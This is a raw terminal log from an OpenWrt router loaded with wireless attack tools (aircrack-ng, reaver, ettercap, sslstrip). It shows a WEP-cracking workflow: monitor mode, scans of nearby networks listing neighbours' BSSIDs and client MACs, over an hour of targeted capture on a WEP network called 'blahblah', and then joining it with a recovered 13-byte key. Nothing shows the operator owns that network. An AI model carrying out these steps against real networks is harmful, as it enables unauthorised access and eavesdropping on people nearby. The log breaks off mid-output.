+root@OpenWrt:/mnt/usb/usr/bin# rm -rf replay_arp-0510-143428.cap 
+root@OpenWrt:/mnt/usb/usr/bin# ls
+aircrack-ng         daq-modules-config  kismet_server       perl                sftp                twistd
+airdecap-ng         elinks              kstats              perl5.10.0          snort               u2boat
+airdecloak-ng       ettercap            makeivs-ng          python              snort.bin           u2spewfoo
+airpwn              etterfilter         mktap               python2.7           ssh                 vim
+buddy-ng            etterlog            nmap                reaver              sshtunnel.sh        wash
+bzip2               ivstools            openssl             scp                 sslstrip
+curl                kismet_client       packetforge-ng      sed                 tar
+root@OpenWrt:/mnt/usb/usr/bin# 
+root@OpenWrt:/mnt/usb/usr/bin# 
+root@OpenWrt:/mnt/usb/usr/bin# 
+root@OpenWrt:/mnt/usb/usr/bin# 
+root@OpenWrt:/mnt/usb/usr/bin# ping
+BusyBox v1.19.4 (2013-03-14 11:28:31 UTC) multi-call binary.
+
+Usage: ping [OPTIONS] HOST
+
+Send ICMP ECHO_REQUEST packets to network hosts
+
+	-4,-6		Force IP or IPv6 name resolution
+	-c CNT		Send only CNT pings
+	-s SIZE		Send SIZE data bytes in packets (default:56)
+	-t TTL		Set TTL
+	-I IFACE/IP	Use interface or IP address as source
+	-W SEC		Seconds to wait for the first response (default:10)
+			(after all -c CNT packets are sent)
+	-w SEC		Seconds until ping exits (default:infinite)
+			(can exit earlier with -c CNT)
+	-q		Quiet, only displays output at start
+			and when finished
+
+root@OpenWrt:/mnt/usb/usr/bin# airmon-ng start wlan0
+ps: invalid option -- A
+BusyBox v1.19.4 (2013-03-14 11:28:31 UTC) multi-call binary.
+
+Usage: ps 
+
+Show list of processes
+
+	w	Wide output
+
+
+
+Interface	Chipset		Driver
+
+mon0		Atheros 	ath9k - [phy0]
+wlan0		Atheros 	ath9k - [phy0]
+				(monitor mode enabled on mon1)
+
+root@OpenWrt:/mnt/usb/usr/bin# airodump-ng mon0
+
+
+ CH 11 ][ Elapsed: 24 s ][ 2014-05-10 17:05                                         
+                                                                                                                                    
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                     
+                                                                                                                                    
+ 00:24:8C:B3:65:51  -17      243       42    1  10  54e  WEP  WEP         blahblah                                                  
+ 88:51:FB:24:D3:5F  -81      206        0    0  11  54e. WPA2 CCMP   PSK  HP-Print-5F-Officejet Pro 8600                            
+ 28:C6:8E:CF:ED:A9  -83       40        0    0  11  54e  WPA2 CCMP   PSK  ngHub_319437NA002EE                                       
+ E0:91:F5:FD:D7:E2  -83       42       15    0  11  54e  WEP  WEP         poolhouse                                                 
+                                                                                                                                    
+ BSSID              STATION            PWR   Rate    Lost  Packets  Probes                                                          
+                                                                                                                                    
+ (not associated)   00:25:AE:E6:09:EB  -66    0 - 1      0       35  INFINITUMsf3s                                                   
+ (not associated)   68:5D:43:65:CB:79  -65    0 - 1      0        7  MatchBox                                                        
+ (not associated)   00:6B:9E:3B:F7:BD  -84    0 - 1      0        6  Carson1                                                         
+ E0:91:F5:FD:D7:E2  90:A4:DE:9B:2C:63  -84    0 - 2e     0        4                                                                  
+
+root@OpenWrt:/mnt/usb/usr/bin# airodump-ng -c 10 --bssid 00:24:8C:B3:65:51 -w out mon0
+
+
+
+ CH 10 ][ Elapsed: 1 min ][ 2014-05-10 17:07 ][ fixed channel mon0: 11                                         
+                                                                                                                                    
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                 
+                                                                                                                                    
+ 00:24:8C:B3:65:51  -18  92      917      145    1  10  54e  WEP  WEP         blahblah                                              
+                                                                                                                                    
+ BSSID              STATION            PWR   Rate    Lost  Packets  Probes                                                          
+                                                                                                                                    
+
+root@OpenWrt:/mnt/usb/usr/bin# airodump-ng -c 10 --bssid 00:24:8C:B3:65:51 -w out mon0
+
+
+
+ CH 10 ][ Elapsed: 4 s ][ 2014-05-10 17:07 ][ fixed channel mon0: 11                                         
+                                                                                                                                    
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                 
+                                                                                                                                    
+ 00:24:8C:B3:65:51  -15  93       64        9    1  10  54e  WEP  WEP         blahblah                                              
+                                                                                                                                    
+ BSSID              STATION            PWR   Rate    Lost  Packets  Probes                                                          
+                                                                                                                                    
+
+root@OpenWrt:/mnt/usb/usr/bin# airodump-ng -c 10 --bssid 00:24:8C:B3:65:51 -w out mon1
+
+
+
+ CH 10 ][ Elapsed: 52 s ][ 2014-05-10 17:08 ][ fixed channel mon1: 11                                         
+                                                                                                                                    
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                 
+                                                                                                                                    
+ 00:24:8C:B3:65:51  -17  82      491       75    1  10  54e  WEP  WEP         blahblah                                              
+                                                                                                                                    
+ BSSID              STATION            PWR   Rate    Lost  Packets  Probes                                                          
+                                                                                                                                    
+
+root@OpenWrt:/mnt/usb/usr/bin# ls
+aircrack-ng           ettercap              nmap                  out-02.kismet.netxml  python2.7             sslstrip
+airdecap-ng           etterfilter           openssl               out-03.cap            reaver                tar
+airdecloak-ng         etterlog              out-01.cap            out-03.csv            scp                   twistd
+airpwn                ivstools              out-01.csv            out-03.kismet.csv     sed                   u2boat
+buddy-ng              kismet_client         out-01.kismet.csv     out-03.kismet.netxml  sftp                  u2spewfoo
+bzip2                 kismet_server         out-01.kismet.netxml  packetforge-ng        snort                 vim
+curl                  kstats                out-02.cap            perl                  snort.bin             wash
+daq-modules-config    makeivs-ng            out-02.csv            perl5.10.0            ssh
+elinks                mktap                 out-02.kismet.csv     python                sshtunnel.sh
+root@OpenWrt:/mnt/usb/usr/bin# rm -rf out-0*
+root@OpenWrt:/mnt/usb/usr/bin# ls
+aircrack-ng         daq-modules-config  kismet_server       perl                sftp                twistd
+airdecap-ng         elinks              kstats              perl5.10.0          snort               u2boat
+airdecloak-ng       ettercap            makeivs-ng          python              snort.bin           u2spewfoo
+airpwn              etterfilter         mktap               python2.7           ssh                 vim
+buddy-ng            etterlog            nmap                reaver              sshtunnel.sh        wash
+bzip2               ivstools            openssl             scp                 sslstrip
+curl                kismet_client       packetforge-ng      sed                 tar
+root@OpenWrt:/mnt/usb/usr/bin# 
+root@OpenWrt:/mnt/usb/usr/bin# 
+root@OpenWrt:/mnt/usb/usr/bin# airodump-ng mon0
+
+
+
+ CH 11 ][ Elapsed: 16 s ][ 2014-05-10 17:14                                         
+                                                                                                                                    
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                     
+                                                                                                                                    
+ 00:24:8C:B3:65:51  -17      158       42    4  11  54e  WEP  WEP         blahblah                                                  
+ 88:51:FB:24:D3:5F  -81       40        0    0  11  54e. WPA2 CCMP   PSK  HP-Print-5F-Officejet Pro 8600                            
+ E0:91:F5:FD:D7:E2  -82       51       10    0  11  54e  WEP  WEP         poolhouse                                                 
+                                                                                                                                    
+ BSSID              STATION            PWR   Rate    Lost  Packets  Probes                                                          
+                                                                                                                                    
+ (not associated)   00:25:AE:E6:09:EB  -63    0 - 1     37       23  INFINITUMsf3s                                                   
+ (not associated)   00:6B:9E:3B:F7:BD  -81    0 - 1      0        1  Carson1                                                         
+ E0:91:F5:FD:D7:E2  90:A4:DE:9B:2C:63  -80    0 - 2e     0        2                                                                  
+
+root@OpenWrt:/mnt/usb/usr/bin# airodump-ng -c 10 --bssid 00:24:8C:B3:65:51 -w out mon0
+
+
+
+
+ CH 10 ][ Elapsed: 1 hour 10 mins ][ 2014-05-10 18:25 ][ fixed channel mon0: 11                                         
+                                                                                                                                    
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                 
+                                                                                                                                    
+ 00:24:8C:B3:65:51  -17 100    34990   256138    1  11  54e  WEP  WEP    OPN  blahblah                                              
+                                                                                                                                    
+ BSSID              STATION            PWR   Rate    Lost  Packets  Probes                                                          
+                                                                                                                                    
+ 00:24:8C:B3:65:51  0C:82:68:F9:20:7A    0    1 - 1      0   994279                                                                  
+root@OpenWrt:/mnt/usb/usr/bin# 
+root@OpenWrt:/mnt/usb/usr/bin# 
+root@OpenWrt:/mnt/usb/usr/bin# iwlist wlan0 scan
+wlan0     Scan completed :
+          Cell 01 - Address: 68:7F:74:B8:B6:61
+                    Channel:1
+                    Frequency:2.412 GHz (Channel 1)
+                    Quality=50/70  Signal level=-60 dBm  
+                    Encryption key:off
+                    ESSID:"Jose-guest"
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 18 Mb/s
+                              24 Mb/s; 36 Mb/s; 54 Mb/s
+                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 48 Mb/s
+                    Mode:Master
+                    Extra:tsf=0000023620697374
+                    Extra: Last beacon: 640ms ago
+                    IE: Unknown: 000A4A6F73652D6775657374
+                    IE: Unknown: 010882848B962430486C
+                    IE: Unknown: 030101
+                    IE: Unknown: 2A0100
+                    IE: Unknown: 2F0100
+                    IE: Unknown: 32040C121860
+                    IE: Unknown: 2D1AFC181BFFFF000000000000000000000000000000000000000000
+                    IE: Unknown: 3D1601081500000000000000000000000000000000000000
+                    IE: Unknown: 4A0E14000A002C01C800140005001900
+                    IE: Unknown: 7F0101
+                    IE: Unknown: DD090010180208F0040000
+                    IE: Unknown: DD180050F2020101800003A4000027A4000042435E0062322F00
+                    IE: Unknown: DD1E00904C33FC181BFFFF000000000000000000000000000000000000000000
+                    IE: Unknown: DD1A00904C3401081500000000000000000000000000000000000000
+          Cell 02 - Address: 68:7F:74:B8:B6:5F
+                    Channel:1
+                    Frequency:2.412 GHz (Channel 1)
+                    Quality=56/70  Signal level=-54 dBm  
+                    Encryption key:on
+                    ESSID:"Jose"
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 18 Mb/s
+                              24 Mb/s; 36 Mb/s; 54 Mb/s
+                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 48 Mb/s
+                    Mode:Master
+                    Extra:tsf=0000023620686be7
+                    Extra: Last beacon: 710ms ago
+                    IE: Unknown: 00044A6F7365
+                    IE: Unknown: 010882848B962430486C
+                    IE: Unknown: 030101
+                    IE: Unknown: 2A0100
+                    IE: Unknown: 2F0100
+                    IE: IEEE 802.11i/WPA2 Version 1
+                        Group Cipher : TKIP
+                        Pairwise Ciphers (2) : CCMP TKIP
+                        Authentication Suites (1) : PSK
+                    IE: Unknown: 32040C121860
+                    IE: Unknown: 2D1AFC181BFFFF000000000000000000000000000000000000000000
+                    IE: Unknown: 3D1601081500000000000000000000000000000000000000
+                    IE: Unknown: 4A0E14000A002C01C800140005001900
+                    IE: Unknown: 7F0101
+                    IE: Unknown: DD7A0050F204104A00011010440001021041000100103B00010310470010318F56E90FDE7CE5CCFA9D6F5DEEAF7B10210005436973636F1023000D4C696E6B7379732045333030301024000776312E302E30311042000234321054000800060050F20400011011000D4C696E6B737973204533303030100800020084
+                    IE: Unknown: DD090010180208F0040000
+                    IE: WPA Version 1
+                        Group Cipher : TKIP
+                        Pairwise Ciphers (2) : CCMP TKIP
+                        Authentication Suites (1) : PSK
+                    IE: Unknown: DD180050F2020101800003A4000027A4000042435E0062322F00
+                    IE: Unknown: DD1E00904C33FC181BFFFF000000000000000000000000000000000000000000
+                    IE: Unknown: DD1A00904C3401081500000000000000000000000000000000000000
+          Cell 03 - Address: E0:91:F5:85:4D:06
+                    Channel:8
+                    Frequency:2.447 GHz (Channel 8)
+                    Quality=70/70  Signal level=-19 dBm  
+                    Encryption key:on
+                    ESSID:"MatchBox"
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 18 Mb/s
+                              24 Mb/s; 36 Mb/s; 54 Mb/s
+                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 48 Mb/s
+                    Mode:Master
+                    Extra:tsf=0000000fbb6403ef
+                    Extra: Last beacon: 230ms ago
+                    IE: Unknown: 00084D61746368426F78
+                    IE: Unknown: 010882848B962430486C
+                    IE: Unknown: 030108
+                    IE: Unknown: 2A0104
+                    IE: Unknown: 2F0104
+                    IE: IEEE 802.11i/WPA2 Version 1
+                        Group Cipher : CCMP
+                        Pairwise Ciphers (1) : CCMP
+                        Authentication Suites (1) : PSK
+                    IE: Unknown: 32040C121860
+                    IE: Unknown: 2D1AFC181BFFFF000000000000000000000000000000000000000000
+                    IE: Unknown: 3D1608080400000000000000000000000000000000000000
+                    IE: Unknown: 4A0E14000A002C01C800140005001900
+                    IE: Unknown: 7F0101
+                    IE: Unknown: DD090010180205F42C0000
+                    IE: Unknown: DD180050F2020101800003A4000027A4000042435E0062322F00
+          Cell 04 - Address: 00:1F:B3:23:8F:A9
+                    Channel:6
+                    Frequency:2.437 GHz (Channel 6)
+                    Quality=30/70  Signal level=-80 dBm  
+                    Encryption key:on
+                    ESSID:"2WIRE083"
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
+                              9 Mb/s; 12 Mb/s; 18 Mb/s
+                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
+                    Mode:Master
+                    Extra:tsf=00001244c0cbd27b
+                    Extra: Last beacon: 430ms ago
+                    IE: Unknown: 00083257495245303833
+                    IE: Unknown: 010882848B960C121824
+                    IE: Unknown: 030106
+                    IE: Unknown: 050400010000
+                    IE: Unknown: 0706555320010B1B
+                    IE: Unknown: 2A0102
+                    IE: IEEE 802.11i/WPA2 Version 1
+                        Group Cipher : TKIP
+                        Pairwise Ciphers (2) : CCMP TKIP
+                        Authentication Suites (1) : PSK
+                    IE: WPA Version 1
+                        Group Cipher : TKIP
+                        Pairwise Ciphers (2) : CCMP TKIP
+                        Authentication Suites (1) : PSK
+                    IE: Unknown: 32043048606C
+          Cell 05 - Address: 00:24:8C:B3:65:51
+                    Channel:11
+                    Frequency:2.462 GHz (Channel 11)
+                    Quality=70/70  Signal level=-18 dBm  
+                    Encryption key:on
+                    ESSID:"blahblah"
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 18 Mb/s
+                              24 Mb/s; 36 Mb/s; 54 Mb/s
+                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 48 Mb/s
+                    Mode:Master
+                    Extra:tsf=000000014057d545
+                    Extra: Last beacon: 100ms ago
+                    IE: Unknown: 0008626C6168626C6168
+                    IE: Unknown: 010882848B962430486C
+                    IE: Unknown: 03010B
+                    IE: Unknown: 2A0104
+                    IE: Unknown: 2F0104
+                    IE: Unknown: 32040C121860
+                    IE: Unknown: DD090010180201F0000000
+                    IE: Unknown: DD180050F2020101800003A4000027A4000042435E0062322F00
+          Cell 06 - Address: 28:C6:8E:CF:ED:A9
+                    Channel:11
+                    Frequency:2.462 GHz (Channel 11)
+                    Quality=24/70  Signal level=-86 dBm  
+                    Encryption key:on
+                    ESSID:"ngHub_319437NA002EE"
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
+                              9 Mb/s; 12 Mb/s; 18 Mb/s
+                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
+                    Mode:Master
+                    Extra:tsf=000014329b898180
+                    Extra: Last beacon: 130ms ago
+                    IE: Unknown: 00136E674875625F3331393433374E413030324545
+                    IE: Unknown: 010882848B960C121824
+                    IE: Unknown: 03010B
+                    IE: Unknown: 050400010000
+                    IE: Unknown: 0706555320010B1E
+                    IE: Unknown: 2A0104
+                    IE: Unknown: 32043048606C
+                    IE: Unknown: 2D1AAD0103FFFF0000000000000000000000000000000406E6E70D00
+                    IE: Unknown: 3D160B001100000000000000000000000000000000000000
+                    IE: Unknown: 4A0E14000A002C01C800140005001900
+                    IE: Unknown: 7F050100000000
+                    IE: Unknown: DD180050F2020101820003A4000027A4000042435E0062322F00
+                    IE: Unknown: DD0900037F01010000FF7F
+                    IE: IEEE 802.11i/WPA2 Version 1
+                        Group Cipher : CCMP
+                        Pairwise Ciphers (1) : CCMP
+                        Authentication Suites (1) : PSK
+                    IE: Unknown: DD0E0050F204104A0001101044000101
+          Cell 07 - Address: 88:51:FB:24:D3:5F
+                    Channel:11
+                    Frequency:2.462 GHz (Channel 11)
+                    Quality=24/70  Signal level=-86 dBm  
+                    Encryption key:on
+                    ESSID:"HP-Print-5F-Officejet Pro 8600"
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
+                              9 Mb/s; 12 Mb/s; 18 Mb/s
+                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
+                    Mode:Master
+                    Extra:tsf=000000131eabf15f
+                    Extra: Last beacon: 120ms ago
+                    IE: Unknown: 001E48502D5072696E742D35462D4F66666963656A65742050726F2038363030
+                    IE: Unknown: 010882848B960C121824
+                    IE: Unknown: 03010B
+                    IE: Unknown: 050400010000
+                    IE: Unknown: 2A0100
+                    IE: IEEE 802.11i/WPA2 Version 1
+                        Group Cipher : CCMP
+                        Pairwise Ciphers (1) : CCMP
+                        Authentication Suites (1) : PSK
+                    IE: Unknown: 32043048606C
+                    IE: Unknown: DD180050F2020101800027A4000003A4000042435E0062322F00
+
+root@OpenWrt:/mnt/usb/usr/bin# iwconfig wlan0 essid blahblah key C6:30:90:99:39:ED:84:80:BD:1D:55:9F:68
+Error for wireless request "Set ESSID" (8B1A) :
+    SET failed on device wlan0 ; Operation not supported.
+root@OpenWrt:/mnt/usb/usr/bin# iwconfig wlan0 essid blahblah
+Error for wireless request "Set ESSID" (8B1A) :
+    SET failed on device wlan0 ; Operation not supported.
+root@OpenWrt:/mnt/usb/usr/bin# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.108  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:148009 errors:0 dropped:10519 overruns:0 frame:0
+          TX packets:147687 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:10768507 (10.2 MiB)  TX bytes:41842499 (39.9 MiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:151452 errors:0 dropped:15 overruns:0 frame:0
+          TX packets:147824 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:14041077 (13.3 MiB)  TX bytes:41848801 (39.9 MiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:28 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:28 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:2700 (2.6 KiB)  TX bytes:2700 (2.6 KiB)
+
+mon0      Link encap:UNSPEC  HWaddr 0C-82-68-F9-20-7A-00-48-00-00-00-00-00-00-00-00  
+          UP BROADCAST NOTRAILERS RUNNING PROMISC ALLMULTI  MTU:1500  Metric:1
+          RX packets:2276040 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:231895563 (221.1 MiB)  TX bytes:0 (0.0 B)
+
+mon1      Link encap:UNSPEC  HWaddr 0C-82-68-F9-20-7A-00-48-00-00-00-00-00-00-00-00  
+          UP BROADCAST NOTRAILERS RUNNING PROMISC ALLMULTI  MTU:1500  Metric:1
+          RX packets:1787319 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:161569200 (154.0 MiB)  TX bytes:0 (0.0 B)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:23072 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:0 (0.0 B)  TX bytes:4364721 (4.1 MiB)
+
+root@OpenWrt:/mnt/usb/usr/bin# airmon-ng stop mon0
+
+
+Interface	Chipset		Driver
+
+mon1		Atheros 	ath9k - [phy0]
+mon0		Atheros 	ath9k - [phy0] (removed)
+wlan0		Atheros 	ath9k - [phy0]
+
+root@OpenWrt:/mnt/usb/usr/bin# airmon-ng stop mon1
+
+
+Interface	Chipset		Driver
+
+mon1		Atheros 	ath9k - [phy0] (removed)
+wlan0		Atheros 	ath9k - [phy0]
+
+root@OpenWrt:/mnt/usb/usr/bin# airmon-ng
+
+
+Interface	Chipset		Driver
+
+wlan0		Atheros 	ath9k - [phy0]
+
+root@OpenWrt:/mnt/usb/usr/bin# iwconfig wlan0 essid blahblah
+Error for wireless request "Set ESSID" (8B1A) :
+    SET failed on device wlan0 ; Operation not supported.
+root@OpenWrt:/mnt/usb/usr/bin# iwconfig wlan0 ESSID blahblah
+Error for wireless request "Set ESSID" (8B1A) :
+    SET failed on device wlan0 ; Operation not supported.
+root@OpenWrt:/mnt/usb/usr/bin# iwconfig wlan0 ESSID "blahblah"
+Error for wireless request "Set ESSID" (8B1A) :
+    SET failed on device wlan0 ; Operation not supported.
+root@OpenWrt:/mnt/usb/usr/bin# ip link set wlan0 down
+-ash: ip: not found
+root@OpenWrt:/mnt/usb/usr/bin# iwconfig wlan0 down
+iwconfig: unknown command "down"
+root@OpenWrt:/mnt/usb/usr/bin# iwconfig wlan0 
+wlan0     IEEE 802.11bgn  Mode:Master  Tx-Power=18 dBm   
+          RTS thr:off   Fragment thr:off
+          Power Management:on
+          
+root@OpenWrt:/mnt/usb/usr/bin# ifconfig wlan0
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:23396 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:0 (0.0 B)  TX bytes:4434494 (4.2 MiB)
+
+root@OpenWrt:/mnt/usb/usr/bin# ifconfig wlan0 down
+root@OpenWrt:/mnt/usb/usr/bin# ifconfig wlan0 up
+root@OpenWrt:/mnt/usb/usr/bin# iwconfig wlan0 ESSID "blahblah"
+Error for wireless request "Set ESSID" (8B1A) :
+    SET failed on device wlan0 ; Operation not supported.
+root@OpenWrt:/mnt/usb/usr/bin# opkg install ceni
+Unknown package 'ceni'.
+Collected errors:
+ * opkg_install_cmd: Cannot install package ceni.
+root@OpenWrt:/mnt/usb/usr/bin# cd /etc/config
+root@OpenWrt:/etc/config# ls
+dhcp           firewall       luci           network.toki   system         ucitrack       wireless.orig
+dhcp.orig      firewall.orig  network        ptunnel        system.orig    uhttpd         wireless.toki
+dropbear       fstab          network.orig   sshtunnel      ubootenv       wireless
+root@OpenWrt:/etc/config# cat wireless
+
+config wifi-device 'radio0'
+	option type 'mac80211'
+	option channel '11'
+	option macaddr '0c:82:68:f9:20:7a'
+	option hwmode '11ng'
+	option htmode 'HT20'
+	list ht_capab 'SHORT-GI-20'
+	list ht_capab 'SHORT-GI-40'
+	list ht_capab 'RX-STBC1'
+	list ht_capab 'DSSS_CCK-40'
+
+config wifi-iface
+	option device 'radio0'
+	option network 'lan'
+	option mode 'ap'
+	option ssid 'OpenWrt'
+	option encryption 'none'
+
+root@OpenWrt:/etc/config# cat wireless.orig 
+
+config wifi-device 'radio0'
+	option type 'mac80211'
+	option channel '11'
+	option macaddr '0c:82:68:f9:20:7a'
+	option hwmode '11ng'
+	option htmode 'HT20'
+	list ht_capab 'SHORT-GI-20'
+	list ht_capab 'SHORT-GI-40'
+	list ht_capab 'RX-STBC1'
+	list ht_capab 'DSSS_CCK-40'
+
+config wifi-iface
+	option device 'radio0'
+	option network 'lan'
+	option mode 'ap'
+	option ssid 'OpenWrt'
+	option encryption 'none'
+
+root@OpenWrt:/etc/config# cat wireless.toki 
+config wifi-device  wlan0
+        option type     mac80211
+        option channel  6
+        option macaddr  0c:82:68:f9:20:7a 
+        option hwmode   11ng
+        option htmode   HT20
+        list ht_capab   SHORT-GI-20
+        list ht_capab   SHORT-GI-40
+        list ht_capab   RX-STBC1
+        list ht_capab   DSSS_CCK-40
+        # REMOVE THIS LINE TO ENABLE WIFI:
+        #option disabled 1
+
+config wifi-iface
+        option device   wlan0
+        option network  wan
+        option mode     sta
+        option ssid     TOKI
+        option encryption none
+
+
+
+root@OpenWrt:/etc/config# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.108  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:149299 errors:0 dropped:11070 overruns:0 frame:0
+          TX packets:148079 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:10917091 (10.4 MiB)  TX bytes:41893579 (39.9 MiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:152849 errors:0 dropped:15 overruns:0 frame:0
+          TX packets:148221 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:14238827 (13.5 MiB)  TX bytes:41900111 (39.9 MiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:28 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:28 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:2700 (2.6 KiB)  TX bytes:2700 (2.6 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:23399 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:0 (0.0 B)  TX bytes:4434940 (4.2 MiB)
+
+root@OpenWrt:/etc/config# cat wireless.toki 
+config wifi-device  wlan0
+        option type     mac80211
+        option channel  6
+        option macaddr  0c:82:68:f9:20:7a 
+        option hwmode   11ng
+        option htmode   HT20
+        list ht_capab   SHORT-GI-20
+        list ht_capab   SHORT-GI-40
+        list ht_capab   RX-STBC1
+        list ht_capab   DSSS_CCK-40
+        # REMOVE THIS LINE TO ENABLE WIFI:
+        #option disabled 1
+
+config wifi-iface
+        option device   wlan0
+        option network  wan
+        option mode     sta
+        option ssid     TOKI
+        option encryption none
+
+
+
+root@OpenWrt:/etc/config# cat wireless.orig 
+
+config wifi-device 'radio0'
+	option type 'mac80211'
+	option channel '11'
+	option macaddr '0c:82:68:f9:20:7a'
+	option hwmode '11ng'
+	option htmode 'HT20'
+	list ht_capab 'SHORT-GI-20'
+	list ht_capab 'SHORT-GI-40'
+	list ht_capab 'RX-STBC1'
+	list ht_capab 'DSSS_CCK-40'
+
+config wifi-iface
+	option device 'radio0'
+	option network 'lan'
+	option mode 'ap'
+	option ssid 'OpenWrt'
+	option encryption 'none'
+
+root@OpenWrt:/etc/config# cat wireless
+
+config wifi-device 'radio0'
+	option type 'mac80211'
+	option channel '11'
+	option macaddr '0c:82:68:f9:20:7a'
+	option hwmode '11ng'
+	option htmode 'HT20'
+	list ht_capab 'SHORT-GI-20'
+	list ht_capab 'SHORT-GI-40'
+	list ht_capab 'RX-STBC1'
+	list ht_capab 'DSSS_CCK-40'
+	option txpower '27'
+	option country 'US'
+
+config wifi-iface
+	option device 'radio0'
+	option network 'lan'
+	option ssid 'OpenWrt'
+	option encryption 'none'
+	option mode 'sta'
+
+root@OpenWrt:/etc/config# iwconfig wlan0 ESSID "blahblah"
+root@OpenWrt:/etc/config# iwconfig wlan0 essid blahblah key C6:30:90:99:39:ED:84:80:BD:1D:55:9F:68
+root@OpenWrt:/etc/config# dhclient wlan0
+-ash: dhclient: not found
+root@OpenWrt:/etc/config# iwconfig
+lo        no wireless extensions.
+
+wlan0     IEEE 802.11bgn  ESSID:"blahblah"  
+          Mode:Managed  Access Point: Not-Associated   Tx-Power=18 dBm   
+          RTS thr:off   Fragment thr:off
+          Encryption key:C630-9099-39ED-8480-BD1D-559F-68
+          Power Management:off
+          
+eth0      no wireless extensions.
+
+br-lan    no wireless extensions.
+
+root@OpenWrt:/etc/config# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.108  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:150729 errors:0 dropped:11335 overruns:0 frame:0
+          TX packets:149153 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:11086749 (10.5 MiB)  TX bytes:42383326 (40.4 MiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:154330 errors:0 dropped:15 overruns:0 frame:0
+          TX packets:149296 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
